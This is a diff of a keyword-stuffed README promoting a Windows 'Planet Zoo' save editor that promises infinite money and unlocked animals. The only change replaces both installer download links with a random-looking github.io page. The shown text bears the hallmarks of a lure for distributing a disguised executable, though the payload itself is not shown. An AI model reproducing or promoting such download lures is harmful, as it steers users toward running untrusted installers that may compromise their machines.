@@ -2,7 +2,7 @@
 
 Planet Zoo Ultimate Save Editor is a comprehensive Windows desktop tool designed for players who want full control over their Planet Zoo experience. Whether you want Planet Zoo infinite money, to unlock all animals instantly, or to fine-tune every aspect of your zoos, this Planet Zoo save editor provides an intuitive interface that reads and modifies your save files safely and efficiently. Updated for the latest 2026 Planet Zoo content, it is the go-to enhancement suite for sandbox builders and career-mode players alike.
 
-[![Download Installer](https://img.shields.io/badge/Download-Setup--latest15.07-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Setup--latest15.07-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -54,7 +54,7 @@ A: The editor automatically saves a backup copy of every file it modifies. Open 
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## License
 
